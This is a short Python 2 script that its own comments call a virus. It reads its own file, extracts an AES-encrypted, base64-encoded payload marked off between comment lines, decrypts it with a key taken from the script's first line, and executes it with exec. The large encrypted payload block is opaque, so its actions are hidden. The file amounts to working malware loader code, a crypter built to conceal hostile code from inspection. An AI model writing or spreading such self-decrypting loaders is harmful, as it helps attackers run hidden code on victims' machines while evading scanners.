######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

def encrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   return base64.b64encode(encrypted)
 ####################

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted












#Start payload
#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
#End payload